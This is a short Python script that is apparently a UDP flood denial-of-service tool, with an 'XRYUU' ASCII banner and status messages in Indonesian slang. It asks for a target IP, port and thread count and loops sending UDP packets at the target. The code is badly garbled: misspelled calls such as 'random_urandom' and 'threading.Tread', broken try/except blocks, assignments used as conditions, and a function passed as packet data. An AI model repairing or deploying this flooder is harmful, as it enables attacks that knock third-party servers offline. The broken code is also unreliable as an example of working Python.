import random
import socket
import threading
import os,sys

os,system("clear")
print("
██╗░░██╗██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
╚██╗██╔╝██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
░╚███╔╝░██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
░██╔██╗░██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██╔╝╚██╗██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░")

ip = str(input("IP:"))
port = int(input("PORT:"))
choice = str(input("DDOS?(y/n):"))
time = int(input("PACKET:"))
threads = int(input("THREADS:"))

def run():
	data = random_urandom (1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
		addr = (str(ip),int(port))
		s.connect((ip,port))
		s.sendto(run)
	for x in range(choice)
	 print("DISENGGOL XRYUU")
except:
	print("YAH SERVERNYA MALAH TURU")
	
def run2():
	data = random_urandom (16)
	while True:
		try:
			s= socket.socket(socket.AF_INET ,socket.SOCK_DGRAM)
		addr = (str(ip),int(port))
		s.connect((ip,port))
		s.sendto(run2)
		for x in range (choice)
			print("DISENGGOL XRYUU")
		except:
			print("YAH SERVERNYA MALAH TURU")
			
for y in range (threads):
	if choice = 'run'
	th = threading.Tread(target = run)
	th.start()
	if choicd = 'run2'
	th = threading.Tread(target = run)
	th.start()
	
		